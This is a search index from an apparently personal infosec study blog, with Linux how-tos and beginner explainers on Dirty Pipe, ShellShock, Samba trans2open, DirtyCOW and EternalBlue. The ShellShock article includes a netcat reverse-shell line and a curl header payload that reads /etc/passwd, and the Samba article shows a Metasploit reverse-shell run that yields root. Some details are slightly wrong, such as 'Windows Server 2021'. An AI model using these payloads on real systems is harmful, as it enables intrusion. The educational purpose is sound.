var relearn_search_index = [
  {
    "content": " Articles about common exploits affecting Windows and Linux system.\nInformation contained in these articles have been sourced from various sites during the course of my studies. I have tried to construct the articles in such a way that it would be easy for beginners in the field (Infosec, or Information Security) to understand. The material provided here is intended solely for educational purposes only. I intend no copyright infringement of any kind. List of sites I have collated the material from, will be mentioned wherever possible. The reader accepts full responsibility for the use of the information provided. While every attempt has been made to ensure that the information contained in these articles has been obtained from reliable sources, I am not responsible for any errors or omissions, or for the results obtained from the use of this information.\nIt is an unsafe and rather risky practice to copy any script from the internet and paste it into your terminal without knowing what the script really does. Read the script carefully and always use virtual machines to practice your hacking skills. Do not attack machines unless you have explicit written permission to do so. Take periodic snapshots of your virtual machines so that you don’t have to rebuild one from scratch if something goes wrong during the course of your learning.\nWe are here to make our computers and networks safe from threats. Understand your responsibilities, please.\n",
    "description": "",
    "tags": null,
    "title": "Exploit Articles",
    "uri": "/exploit-articles/index.html"
  },
  {
    "content": "",
    "description": "",
    "tags": null,
    "title": "apache",
    "uri": "/tags/apache/index.html"
  },
  {
    "content": "For this activity, we will use a Debian 12 VM with apache installed. The debian installer gives us an option to install a web server (among other things) during the installation process. In case we need to install apache2 after the machine has booted up, it can be done with apt install apache2.\nEither way, once you have apache installed, we can go to http://your_server_ip and we’ll get the default apache landing page as show inthe screen grab below.\nOur task here is to host a sample site on the machine and enable access to it via https://server_ip.\nBy default, /var/www/html is the document root directory (web root) for apache. This is the main directory where apache looks for files to serve to clients requesting them.\nCreating our website We will start with creating a directory for our site under var/www/.\nsudo mkdir /var/www/oursamplesite If we do a directory listing with ls -l /var/www, we can see that our newly created directory is owned by root, as show in the screen grab below.\nWe need to change the ownership of this directory to www-data. www-data is the usr that apache use by default for normal operation. Apache can access any file/directory that www-data can access. We can change the owneship of the newly created directory with the command\nsudo chown -R www-data:www-data /var/www/oursamplesite Now that we have the directory ownership changed, we will add our current user havoc to the www-data group with the command\nsudo usermod -aG www-data havoc Now we need to set persmissions for apache and havoc to write and read files in the newly created directoy. This is accomplished with the following command\nsudo chmod -R 770 /var/www/oursamplesite user havoc will need to log out and then login again for new group permissions to take effect.\nWith the required ownership and permissions set, we now proceed to put a sample HTML page there by creating an index.html file.\nsudo nano /var/www/oursamplesite/index.html \u003c!DOCTYPE html\u003e \u003chtml\u003e \u003chead\u003e \u003ctitle\u003eWelcome to Our Sample Site\u003c/title\u003e \u003c!-- The \u003cstyle\u003e tag is not required, but who doesn't like a little style--\u003e \u003cstyle\u003e * { box-sizing: border-box; font-family: Arial, Helvetica, sans-serif; } body { margin: 0; font-family: Arial, Helvetica, sans-serif; } /* Style the top navigation bar */ .topnav { overflow: hidden; background-color: #333; } /* Style the topnav links */ .topnav a { float: left; display: block; color: #f2f2f2; text-align: center; padding: 14px 16px; text-decoration: none; } /* Change color on hover */ .topnav a:hover { background-color: #ddd; color: black; } /* Style the content */ .content { background-color: #ddd; padding: 10px; height: 200px; /* Should be removed. Only for demonstration */ } /* Style the footer */ .footer { background-color: #f1f1f1; padding: 10px; } \u003c/style\u003e \u003c/head\u003e \u003cbody\u003e \u003cdiv class=\"content\"\u003e \u003ch2\u003eWelcome to Our Sample Site\u003c/h2\u003e \u003cp\u003eThis is a sample HTML page for the Our Sample Site.\u003c/p\u003e \u003c/div\u003e \u003cdiv class=\"footer\"\u003e \u003cp\u003ePage footer\u003c/p\u003e \u003c/div\u003e \u003c/body\u003e \u003c/html\u003e We now have to configure our apache virtualhost config to serve our site’s content. We do this by creating a file oursamplesite.conf in the /etc/apache2/sites-available/ directory.\nsudo nano /etc/apache2/sites-available/oursamplesite.conf and put the following content in it.\n\u003cVirtualHost *:80\u003e ServerName oursamplesite DocumentRoot /var/www/oursamplesite \u003cDirectory /var/www/oursamplesite\u003e Options Indexes FollowSymLinks AllowOverride All Require all granted \u003c/Directory\u003e ErrorLog ${APACHE_LOG_DIR}/oursamplesite_error.log CustomLog ${APACHE_LOG_DIR}/oursample_access.log combined \u003c/VirtualHost\u003e We can check for any errors in the config file with sudo apachectl -t. If our config file has no errors, we will get the message Syntax OK.\nEnable the site with sudo a2ensite oursamplesite.conf.\nDisable the default apache2 landing page with sudo a2dissite 000-default.conf.\nRestart apache with sudo systemctl restart apache2.\nVerify that the new site is up and running by going to https://server-ip.\nIf we have firewall enabled on our server, we will configure it to open port 80 with sudo ufw allow \"WWWW\". For IPTABLES, the equivalent command is iptables -I INPUT -p tcp --dport 80 -j ACCEPT and for firewalld. it would be:\nfirewall-cmd --add-port=80/tcp --permanent firewall-cmd --reload Configure Apache with https Generate SSL/TLS certificates We will use self signed certificates since we are running the web server in our local network. If we have to expose our site to the internet, there are ways to do this with NGINX Reverse Proxy or Cloudflare tunnels.\nGenerate a private key sudo mkdir /etc/ssl/oursamplesite sudo openssl genrsa -out /etc/ssl/oursamplesite/oursamplesite-private.key 4096 Generate CSR (Certificate Signing Request) sudo openssl req -new -key /etc/ssl/oursamplesite/oursamplesite-private.key \\ -out /etc/ssl/oursamplesite/oursamplesite-csr.pem \\ -subj \"/C=US/ST=CL/L=California/O=OurSampleSite/CN=oursamplesite\" Of these parameters above, the most important one is CN=oursamplesite. Please ensure that you edit it to whatever is the domain name you want to use.\nGenerate the SSL/TLS certificate sudo openssl x509 -req -days 3650 -in /etc/ssl/oursamplesite/oursamplesite-csr.pem \\ -signkey /etc/ssl/oursamplesite/oursamplesite-private.key -out /etc/ssl/oursamplesite/oursamplesite-cert.crt After executing these commands (use sudo with these commands unless you are running as root), we will have the following files in our /etc/ssl/oursamplesite directory.\nInstall/Enable Apache SSL modules sudo a2enmod ssl Confirm with apachectl -M | grep ssl. You should get an output ssl_module (shared) if all is well.\nUpdate config to use SSL/TLS Edit the file we created earlier, /etc/apache2/sites-available/oursamplesite.conf\n\u003cVirtualHost *:80\u003e ServerName oursamplesite Redirect permanent / https://192.168.0.97/ #DocumentRoot /var/www/oursamplesite \u003c/VirtualHost\u003e \u003cVirtualHost *:443\u003e ServerName oursamplesite SSLEngine on SSLCertificateFile /etc/ssl/oursamplesite/oursamplesite-cert.crt SSLCertificateKeyFile /etc/ssl/oursamplesite/oursamplesite-private.key DocumentRoot /var/www/oursamplesite \u003cDirectory /var/www/oursamplesite\u003e Options Indexes FollowSymLinks AllowOverride All Require all granted \u003c/Directory\u003e ErrorLog ${APACHE_LOG_DIR}/oursamplesite_error.log CustomLog ${APACHE_LOG_DIR}/oursample_access.log combined \u003c/VirtualHost\u003e Enable apache rewrite modules sudo a2enmod rewrite, check for errors with sudo apachectl -t and restart apache2 with sudo systemctl restart apache2\nIf required, update firewall rules with the following commands as applicable\nufw allow \"WWW Secure\"\niptables -I INPUT -p tcp --dport 443 -j ACCEPT\nfirewall-cmd --add-port=443/tcp --permanent firewall-cmd --reload That’s it. The self signed certificate we generated will however not be trusted by the browser and you will need to add an exception when your browser of choice displays a warning to that effect.\nYou can now navigate to https://server_ip to access our site. Even if we use HTTP to navigate to our site, the Redirect statment in our config file will redirect the connection to HTTPS.\n",
    "description": "",
    "tags": [
      "ssl",
      "apache",
      "https"
    ],
    "title": "Apache2 Custom Site With Self Signed Certificate",
    "uri": "/linux-howto/apache2-custom-site-with-self-signed-certificate/index.html"
  },
  {
    "content": "",
    "description": "",
    "tags": null,
    "title": "https",
    "uri": "/tags/https/index.html"
  },
  {
    "content": "",
    "description": "",
    "tags": null,
    "title": "ssl",
    "uri": "/tags/ssl/index.html"
  },
  {
    "content": "",
    "description": "",
    "tags": null,
    "title": "Tags",
    "uri": "/tags/index.html"
  },
  {
    "content": "",
    "description": "",
    "tags": null,
    "title": "decrypt",
    "uri": "/tags/decrypt/index.html"
  },
  {
    "content": "",
    "description": "",
    "tags": null,
    "title": "encrypt",
    "uri": "/tags/encrypt/index.html"
  },
  {
    "content": " Today, we will look at encrypting and sharing files securely using gpg. GnuPG (GPG) is a tool used to encrypt data and create digital signatures.\nFor our exercise, we will consider two users on two different linux systems. They are running a mustard smuggling operations out of an undisclosed location and need to share information securely, to avoid any interception by Mustardpol. 😉\nUser1 : sierra1 with email sierra1@mustardops.org User2 : november2 with email november2@mustardops.org\nThe workflow goes as follows:\nsierra1 wants to send details of the next shipment of mustard to november2. Both these guys needs to create their own key pairs (public and private) on their respecive systems. Once the key pairs have been generated, they will share their repective public keys with each other. (We will assume that they can do so by using rsync). Sharing public keys can be done via open communication channels like email, but there should be a mechanism by which you have the assurance that the public key does belong to the person with whom you wish to share information with.\nThe private keys, however should never be shared and should be stored securely.\nUser1 and User2 generates their own key pairs with the following command:\ngpg --full-generate-key They answer the prompts generated by gpg and end up with their key pair. We can list our key pairs with:\ngpg --list-public-keys gpg --list-secret-keys # displays the private keys Public Key Listing (User1) Private Key Listing (User1)\nThe same comands as above will be executed by User2, substituting the name and email address parameters.\nPublic Ket Listing (User2)\nPrivate Key Listing (User2)\nThey will now need to export their public keys into a file and share those with each other. This is done with the fillowing command:\ngpg --export -o sierra1.key 68A14F32098A4698C1DF53C631E2FFFE296EA030 # the last paramater is the key ID which is displayed when we list the kseys with the -list-keys option above Now that they have shared their public keys with each other, they need to import the public keys into their respective system’s public keyring with the following command.\ngpg --import sierra1.key # User2 will execute this command on his system gpg --import november2.key ## User1 will execute this command on his system The next step will be encrypting files and sending them to the recipeint. Lets say that User1 want to send a text file mustard_shipments.txt to User2. He will do so with the follwing command:\ngpg -e -r november2@mustardops.org mustard_shipments.txt This command will create a file named mustard_shipments.txt.gpg, which can be send to the recipient. The recipient can now decrypt the file with the following command:\ngpg -d mustard_shipments.txt.gpg ## store the decrypted data in shipment.txt gpg -d -o shipment.txt mustard_shipments.txt.gpg We can use gpg to encrypt a file with gpg -c file_to_be_encrypted.txt. You will be prompted for a password during the encryption process. This command will create an encrypted file named file_to_be_encrypted.txt.gpg.\n⚠️ If the file you are encrypting contains really sensitive data, you should erase the original file securely once it hs been encrypted.\nTo decrypt the file use gpg -d file_to_be_encrypted.txt.gpg\nYou can delete a user’s GPG Keys from your system with the following command(s):\ngpg --delete-secret-key november2@mustardops.org pg --delete-key november2@mustardops.org ",
    "description": "",
    "tags": [
      "encrypt",
      "gpg",
      "gnupg",
      "decrypt"
    ],
    "title": "Encrypt and Share Files With Gpg",
    "uri": "/linux-howto/encrypt-and-share-files-with-gpg/index.html"
  },
  {
    "content": "",
    "description": "",
    "tags": null,
    "title": "gnupg",
    "uri": "/tags/gnupg/index.html"
  },
  {
    "content": "",
    "description": "",
    "tags": null,
    "title": "gpg",
    "uri": "/tags/gpg/index.html"
  },
  {
    "content": "",
    "description": "",
    "tags": null,
    "title": "generate",
    "uri": "/tags/generate/index.html"
  },
  {
    "content": "",
    "description": "",
    "tags": null,
    "title": "linux",
    "uri": "/tags/linux/index.html"
  },
  {
    "content": "",
    "description": "",
    "tags": null,
    "title": "password'",
    "uri": "/tags/password/index.html"
  },
  {
    "content": "",
    "description": "",
    "tags": null,
    "title": "secure",
    "uri": "/tags/secure/index.html"
  },
  {
    "content": "There are many utilities in Linux that help us in generating random passwords. The neccessity of having a strong password is well known. The problem with random passwords is that it is nearly impossible for us remember them. Using a password manager like KeePassX or KeePass2. That way, you only have to remember one password, the master pasword to unlock your password vault. This leads to another monkey’s tail scenario. If we loose/forget the master password, we you’re doomed.\nUtilities you can use OpenSSL You can use OpenSSL to generate a random password for you with the following command:\nopenssl rand -base64 20 # This command will generate a random 20 character long password as shown below. XAOuOA3ZE+RnHxHqo8tAJgT0p8k= Urandom We can generate randomg passwords with /dev/urandom like so\nsudo \u003c /dev/urandom tr -dc A-Za-z0-9 | head -c20; echo # here we are using the alphanumeric charset with a length of 20 chars PsZo8QTxYwv5aoc2rxR1 pwgen pwgen -ysBv 20 -n1 # we are geerating a 20 character long password. alter the -n parameter to generate more passwords 9h$FR{v/*7.z$/$9zfx- gpg We can generate random secure passwords with gpg using the following command. We will specify s length of 20 chars.\ngpg --gen-random --armor 1 20 # this command will generate a secure, random base64 encoded apssword B0nKqkHe/lJnu0Z6npYxvUILgYw= SHA (Secure Hashing Algorithm) date +%s | sha256sum | base64 | head -c 20 ; echo OWE3ZjY3YjY0MjZiZDVi md5 date | md5sum b796eaba55e90433a3f8041203b338b4 xkcdpass xkcdpass is not installed by default, (atleast on Debian 12 on which I’m running these commands.) it can be installed via apt install kkcdpass. This proram will generate a list of words which you could use as your passphrase.\nhavoc@trident:~$ xkcdpass palpitate arguable popper renegade eclipse boned diceware diceware functions in a manner similar to xkcdpass.\nhavoc@trident:~$ diceware AmbushUnworldlyUnmadePoachCofounderDisown you can specify the wordlist to use with the --wordlist parameter like so:\nhavoc@trident:~$ diceware --wordlist en_eff FitHungerTrillionLevelDrinkableJarring Use any of these utilities to generate your passwords. You could use a passwords manager to store these passwords. Keepass2 has an inbuilt password manager you can use to generate passwords. ⚠️Pick your poison, stay safe online. Whereever possible, use 2FA (Two Factor Authentication). Store your backup codes (yes, you can download your backp codes for your online services, which can be used when you don’t access to your 2FA devices. I once lost access to my dropbox because I didnt have my backup codes 😢) in a secure location and manner.\n",
    "description": "",
    "tags": [
      "linux",
      "password'",
      "generate",
      "secure"
    ],
    "title": "Secure Passwords in Linux",
    "uri": "/linux-howto/secure-passwords-in-linux/index.html"
  },
  {
    "content": " Generate secure passwords in Linux Click here Encrypt and Share Files With GPG Click here Apache2 Custom Site With Self Signed Certificate Click here ",
    "description": "",
    "tags": null,
    "title": "Linux How To",
    "uri": "/linux-howto/index.html"
  },
  {
    "content": " Vulnerability Affected OS CVE CVSS Score Disclosure Date Dirty Pipe Linux (kernel versions 5.8 and newer) CVE-2022-0847 7.8 (high) March 7 2022 This exploit was disclosed by Max Kellermann.\nDirtyPipe is a local privilege escalation vulnerability, which allows a user to bypass file permission restrictions and write arbitrary data to any file, provided certain conditions are met, the primary one being that the user has to have read permissions to the file.\nIn order to understand this vulnerability, we need to understand the following concepts:\npipe page splice() Pipe: A pipe is a communication method between two or more processes in which the output of one process can be used as the input for the other. An example of a pipe is ls -la | grep Documents. In this example, the output of the ls command (which is a listing of files and directories) is piped into the grep command which in turn, looks for the string Documents in that input and displays the results on screen. Pipes are unidirectional, with a read end and a write end.\nPage: Memory management in Linux makes use of pages. Whether it is to read from a file on the secondary memory (like the hard drive) or to write to it, pages are used. Memory pages are 4 KB in size. Whenever data is read from the secondary memory, it is put into the page cache. Likewise, when data is to be written to the disk, it is placed in the page cache and eventually written to the disk. This setup eliminates the need to expensive read-write operations to the disk. Since main memory is way faster than secondary memory, this scheme helps performance. One point that is of relevance when talking about this vulnerability is the PIPE_BUF_FLAG_CAN_MERGE flag, which indicates whether merging more data into the pipe is allowed or not.\nsplice(): is a system call (a system call is a way through which a process requests a service from the operating system) which moves data between a file descriptor and a pipe, without copying between kernel address space and user address space. The pipe doesn’t actually contain the data itself, but a reference to the location of the page cache in memory, where the data is stored.\nThe way this vulnerability is exploited is as follows:\nRead the target file. This will cause the file to be placed in the page cache. Create a pipe in a special way so that the PIPE_BUF_FLAG_CAN_MERGE is set. Use the splice() system call to make the pipe point to the locations of the page cache where the data is cached. Write arbitrary data into the pipe. The data so written will overwrite the cached page file and since the PIPE_BUF_FLAG_CAN_MERGE is set, it overwrites the file on the disk. Exploit code available on exploit-db.com\nThe blog post by Max Kellermann about this exploit linked here is a fascinating read.\n",
    "description": "",
    "tags": [
      "exploit",
      "linux"
    ],
    "title": "Dirty Pipe",
    "uri": "/exploit-articles/dirty-pipe/index.html"
  },
  {
    "content": "",
    "description": "",
    "tags": null,
    "title": "exploit",
    "uri": "/tags/exploit/index.html"
  },
  {
    "content": "",
    "description": "",
    "tags": null,
    "title": "bash",
    "uri": "/tags/bash/index.html"
  },
  {
    "content": " ShellShock is a vulnerability in the Bash shell (GNU Bash upto version 4.3) that allows Bash to execute unintentional commands from environment variables. Attackers can issue commands remotely on the target host with elevated privileges, resulting in complete takeover of the system.\nLet us have a look at what environment variables are.\nEnvironment variables are the variables specific to a certain environment, like a root user would have different environment variables than a normal user in a Linux system.\nThe env command prints out a list of all the environment variables for your login on to the screen. Some examples of environment variables are USER, HOME, SHELL, LANG etc. You can set an environment variable with export VARIABLE_NAME=variable_value. One point to note is that environment variables declared in this manner are valid only for the current bash session. In order to persist environment variables, you can define them in your .bashrc file. You could also print out specific env variables with the echo command, like echo $HOME.\nShellShock vulnerability is particularly dangerous due to the fact that a wide array of IoT smart devices like routers, webcams, home security systems etc. could potentially be targets to attacks. Applications like web and mail servers, DNS servers use bash to communicate with the underlying operating system, rendering them susceptible to attacks. ShellShock could also be used to launch DoS attacks on vulnerable servers.\nNow, for details on how this vulnerability affects systems.\nBash scripting language supports functions, that contain pieces of code that can be reused. We can also store the functions so defined, in environment variables, which would let bash scripts export functions as environment variables and allow a sub-shell to use them. Let us break it down a bit.\nYou can define bash functions with the syntax greeting=() { echo \"Hi dawns33ker\"; } The vulnerability arises from how bash implemented importing functions stored in environment variables. Whenever a new shell is created, bash looks through the environment variables for functions and imports all the defined functions. This is done by simply removing the = and evaluating the result.\nFor example, the greetings function above would become greeting() { echo \"Hi dawns33ker\"}; Due to ShellShock, it is possible to exploit this behaviour by adding extra code to the end of the function definition.\nLet us take the case of a function being defined as an environment variable. env X='() { :; }; echo \"bash vulnerable\"' bash -c :. This is a function which will determine if your version of bash is vulnerable to ShellShock. If vulnerable, the function will print the message bash vulnerable or else it prints nothing.\nThis function assignment consists of two commands. The first part is assigning the value X='() { :; }; echo \"bash vulnerable\"' to X. The value assigned to X is designed to exploit the ShellShock vulnerability, i.e chaining a command to the function definition, in this case the echo command. The second part i.e bash -c invokes a new bash shell with the command : which does nothing. That is to say that the first part of the payload () { :;}is a function that does nothing. The second part echo \"bash vulnerable\" which has been chained to the function definition is the malicious payload that will be executed when the function is imported.\nAs explained above, when the function is imported, the = is removed and the line X='() { :; }; echo \"bash vulnerable\" is passed to the bash interpreter. The ; is being a command separator, the definition of the X function and the malicious payload both are executed. The echo command would obviously be replaced by something more menacing, like spawning a reverse shell on the attacker PC, like, nc 10.10.11.1 4455 -e /bin/bash \u0026' bash -c :. This example works by using netcat to open a bash session and redirect input and output to the attacker’s machine. The \u0026 operator means that the session is opened in the background and now the attacker has a shell on the vulnerable system.\nShellShock can be exploited by using HTTP requests to a vulnerable server. An attacker could craft a request like () { :; }; echo \"PASSWD:\" $(\u003c/etc/passwd) and send the request to the server with curl -H \"User-Agent: () { :; }; echo \"PASSWD:\" $(\u003c/etc/passwd)\" http://example.com/\nReferences:\nGitHub\nCloudflare Blogs\nExploit Code:\nApache mod_cgi - ‘Shellshock’ Remote Command Injection\ndhclient 4.1 - Bash Environment Variable Command Injection (Shellshock)\nBash - ‘Shellshock’ Environment Variables Command Injection\n",
    "description": "",
    "tags": [
      "exploit",
      "linux",
      "bash"
    ],
    "title": "ShellShock",
    "uri": "/exploit-articles/shellshock/index.html"
  },
  {
    "content": "",
    "description": "",
    "tags": null,
    "title": "samba",
    "uri": "/tags/samba/index.html"
  },
  {
    "content": "A little about Samba.\nSamba is the standard Windows interoperabiity suite of programs for Linux and Unix. The Samba package provides secure, stable and fast file and print services for all clients such as OS/2, Linux, FreeBSD, using the SMB/CIFS protocol.\nSamba is an important component to seamlessly integrate Linux servers and desktops into a Windows Active Directory environment. It can function both as a domain controller or as a regular domain member.\nIn Samba versions 2.2.0 to 2.2.8a, running on x86 Linux systems that do not have the noexec stack option set, there exists a buffer overflow vulnerability which could lead to remote administrative privilege compromise. This vulnerability could allow a remote attacker to execute arbitrary code on the affected system. The stack overflow error is believed to be in the trans2open() function call.\nThere are at least 3 variants of the trans2open exploit, one written in C and two written in the Perl scripting language.\nSamba trans2open Overflow (Linux x86) - Metasploit\nThere are four metasploit exploit modules, as shown in the screenshot below:\nBasic usage:\nmsf6 \u003e use exploit/linux/samba/trans2open [*] No payload configured, defaulting to linux/x86/meterpreter/reverse_tcp msf6 exploit(linux/samba/trans2open) \u003e options Module options (exploit/linux/samba/trans2open): Name Current Setting Required Description ---- --------------- -------- ----------- RHOSTS yes The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/us ing-metasploit.html RPORT 139 yes The target port (TCP) Payload options (linux/x86/meterpreter/reverse_tcp): Name Current Setting Required Description ---- --------------- -------- ----------- LHOST 10.0.2.15 yes The listen address (an interface may be specified) LPORT 4444 yes The listen port Exploit target: Id Name -- ---- 0 Samba 2.2.x - Bruteforce View the full module info with the info, or info -d command. We need to set the following options before running the exploit\nRHOSTS → IP Address of the target Linux server LHOST → IP Address of the attacker machine Set the payload with set payload linux/x86/shell_reverse_tcp Once both these options are set, execute the exploit by typing run or exploit.\nMetasploit will run the exploit, and you will get root privileges on the target machine.\n[*] Started reverse TCP handler on 192.168.56.11:4444 [*] 192.168.56.110:139 - Trying return address 0xbffffdfc... [*] 192.168.56.110:139 - Trying return address 0xbffffcfc... [*] 192.168.56.110:139 - Trying return address 0xbffffbfc... [*] 192.168.56.110:139 - Trying return address 0xbffffafc... [*] 192.168.56.110:139 - Trying return address 0xbffff9fc... [*] 192.168.56.110:139 - Trying return address 0xbffff8fc... [*] 192.168.56.110:139 - Trying return address 0xbffff7fc... [*] 192.168.56.110:139 - Trying return address 0xbffff6fc... [*] Command shell session 1 opened (192.168.56.11:4444 -\u003e 192.168.56.110:32773) at 2022-05-24 19:34:58 +0400 [*] Command shell session 2 opened (192.168.56.11:4444 -\u003e 192.168.56.110:32774) at 2022-05-24 19:34:59 +0400 [*] Command shell session 3 opened (192.168.56.11:4444 -\u003e 192.168.56.110:32775) at 2022-05-24 19:35:01 +0400 [*] Command shell session 4 opened (192.168.56.11:4444 -\u003e 192.168.56.110:32776) at 2022-05-24 19:35:02 +0400 id uid=0(root) gid=0(root) groups=99(nobody) Reference Links:\nexploit-db.com\ninfosecmatter.com\nsamba.org\nmetasploit.com\n",
    "description": "",
    "tags": [
      "exploit",
      "samba",
      "linux"
    ],
    "title": "Samba Trans2open Exploit",
    "uri": "/exploit-articles/samba-trans2open-exploit/index.html"
  },
  {
    "content": "",
    "description": "",
    "tags": null,
    "title": "dirtycow",
    "uri": "/tags/dirtycow/index.html"
  },
  {
    "content": "DirtyCOW (CVE-2016-5195) The DirtyCOW is a vulnerability in the Linux kernel which allowed processes, write access to read only memory mappings. This vulnerability was discovered by Phil Oester.\nThe vulnerability is called DirtyCOW because the issue is caused by a race condition 1 in the way the kernel handles copy-on-write (COW) COW is an optimization strategy used by operating systems. When multiple processes ask for resources, the system can give them pointers to the same resource. This state can be maintained until a program tries to modify its copy of the resource. When processes try to do this, a private copy of the resource is created so that other processes cannot read that data. The Linux kernel’s COW implementation had a flaw which causes a race condition, allowing non-privileged users to alter root owned files. This flaw, effectively gives unprivileged local users write access to otherwise ready only memory mappings and thus elevate their privileges on the affected system.\nThe dirty part of the name comes from the Dirty Bit. A dirty bit or modified bit is a bit that is associated with a block of memory and indicates whether the corresponding block of memory has been modified. The dirty bit is set when the processor writes to (modifies) this memory. The dirty bit indicates that its associated block of memory has been modified and not saved to storage yet.\nWhen a block of memory is to be replaced, its corresponding dirty bit is checked to see if the block needs to be written back to secondary memory before being replaced, or it can simply be removed. Dirty bits are used by CPU cache and page replacement algorithms of operating systems.\nWhile most mainstream systems have been patched, there are several other Linux based embedded devices like access control devices, biometric scanners and employee attendance recording devices that are still vulnerable. Since these devices may not receive security updates, DirtyCOW still is an attack vector where such devices are used. The real risk of the vulnerability is when user level access and code execution ability, exists on the device.\nThe vulnerability was patched in Linux kernel versions 4.8.3, 4.7.9, 4.4.26 and newer. The first patch released in 2016 did not fully address remediation of the issue and a revised patch was released in November 2017, before public disclosure of the vulnerability.\nExploit code for this vulnerability is available on https://www.exploit-db.com/exploits/40839. You might have come across and probably ran this exploit while working vulnhub machines.\nA POC exploit is available on GitHub. This exploit script needs to be compiled and run on the affected system in order for it to work.\nA detection/scanner script for this vulnerability is available on https://access.redhat.com/sites/default/files/rh-cve-2016-5195_1.sh.\nAndroid devices ZINU is the first malware for Android devices, which exploit the DirtyCOW vulnerability. It can be used to root any devices upto Android 7.0 Nougat. According to a report from security vendor TrendMicro, over 300,000 malicious apps carrying ZINU were reported in the wild, as of September 2017. Once the user launches an infected app, ZINU connects to its C\u0026C server, then uses the DirtyCOW exploit to gain root privileges to the device. While the exploit cannot be executed remotely, malicious apps can still plant backdoors and execute remote control attacks.\nReferences https://www.secpod.com/blog/dirty-cow-vulnerability/ A YouTube video explaining the exploit is here. https://www.makeuseof.com/tag/dirty-cow-vulnerability-everything-know/ A race condition occurs when two or more threads can access shared data and they try to change it at the same time. Because the thread scheduling algorithm can swap between threads at any time, you don’t know the order in which the threads will attempt to access the shared data. Therefore, the result of the change in data is dependent on the thread scheduling algorithm, i.e. both threads are “racing” to access/change the data. ↩︎\n",
    "description": "",
    "tags": [
      "exploit",
      "dirtycow"
    ],
    "title": "The Dirtycow Exploit",
    "uri": "/exploit-articles/the-dirtycow-exploit/index.html"
  },
  {
    "content": " EternalBlue is the name given to a series of Microsoft software vulnerabilities, as well as an exploit developed by the Unites State’s NSA, as a cyber attack tool. Although the EternalBlue exploit affects only Windows operating systems, anything that uses the SMBv1 file sharing protocol is vulnerable to attack, such as Siemens ultrasound medical equipment.\nEternalBlue was developed the NSA as a part of their controversial program of stockpiling and weaponizing cybersecurity vulnerabilities, rather that flagging those to the appropriate vendor for remediation. The NSA used EternalBlue for 5 years, before alerting Microsoft of its existence. This was probable due to the fact that a group of hackers called The Shadow Brokers hacked the NSA and released their cyber weaponry to the wild. EternalBlue was released as the fifth is a series, the title of the release being Lost in Translation. This was done via a link on their Twitter account, on April 14, 2017.\nBefore it leaked, EternalBlue was one of the most useful exploits in the NSA’s arsenal, used in countless intelligence gathering and counter-terrorism operations. - The New York Times.\nIn short, the NSA discovers the EternalBlue vulnerability and develops an exploit which then was used for their operations for a period of 5 years. Then, they get hacked by The Shadow Brokers, leaving the NSA with no other option than to inform Microsoft if its existence. Microsoft in turn, released the patch MS17-010. This patch was designed to fix the EternalBlue vulnerability in all versions of Windows including Windows Vista, Windows 8.1, Windows 10, Windows Server 2008, Windows Server 2021 and Windows Server 2016.\nDue to the severity of the vulnerability and the sheer number of devices out there, Microsoft also released patched for unsupported versions of Windows like XP and Server 2003.\nHow the exploit works. The exploit works by taking advantage of the vulnerabilities present in SMBv1 protocol in older versions of Windows. SMBv1 was first developed in 1983 as a network communication protocol to enable shared access to file and printers (among others). The exploit makes use of the way Windows handles (or mishandles) specially crafted packets from malicious attackers. Once the attacker send a specially crafted packet to the target server, he could potentially get elevated privileges to the target server. From the target, the attacker could then, potentially move laterally across the network, further compromising other machines.\nThe EternalBlue vulnerability has been famously used to spread the WannaCry, Petya and NotPetya ransomware. The WannaCry cyber attack began on May 2017, spreading at the rate of 16,000 devices per hour, infecting over 230,000 Windows computers across 150 countries in a single day.\nAlmost a million computers still use the vulnerable SMBv1 protocol and remain online. As long as these machines remain unpatched, EternalBlue truly will remain ETERNAL.\nResource Links:\nMicrosoft Security Bulletin MS17-010 - Critical What Is EternalBlue and Why Is the MS17-010 Exploit Still Relevant? ",
    "description": "",
    "tags": [
      "eternalblue",
      "exploit"
    ],
    "title": "Eternal Blue",
    "uri": "/exploit-articles/eternal-blue/index.html"
  },
  {
    "content": "",
    "description": "",
    "tags": null,
    "title": "eternalblue",
    "uri": "/tags/eternalblue/index.html"
  },
  {
    "content": "",
    "description": "",
    "tags": null,
    "title": "Categories",
    "uri": "/categories/index.html"
  }
]
